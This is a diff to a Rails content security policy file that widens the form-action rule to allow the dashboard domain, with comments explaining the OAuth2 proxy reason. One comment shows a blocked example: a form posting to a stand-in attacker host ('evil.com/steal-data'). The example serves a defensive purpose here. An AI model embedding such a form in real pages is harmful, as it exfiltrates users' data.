@@ -85,10 +85,13 @@ Rails.application.config.content_security_policy do |policy|
   policy.frame_src :self, "*.cloud.sap" 
 
   # FORM ACTIONS - Controls where forms can submit data
-  # :self = forms can only submit to same origin
-  # ✅ Allowed: <form action="/users" method="post">
+  # :self = forms can only submit to same origin (relative paths)
+  # *domains = explicitly allow dashboard domain (needed for OAuth2 proxy)
+  # Note: OAuth2 proxy can cause Rails form helpers to generate absolute URLs
+  # ✅ Allowed: <form action="/users" method="post">,
+  #            <form action="https://dashboard.qa-de-1.cloud.sap/monsoon3/accept_terms_of_use">
   # ❌ Blocked: <form action="https://evil.com/steal-data" method="post">
-  policy.form_action :self
+  policy.form_action :self, *domains
 
   # OBJECT SOURCES - Controls plugins and embedded objects
   # :none = completely blocks all plugins (Flash, Java applets, etc.)
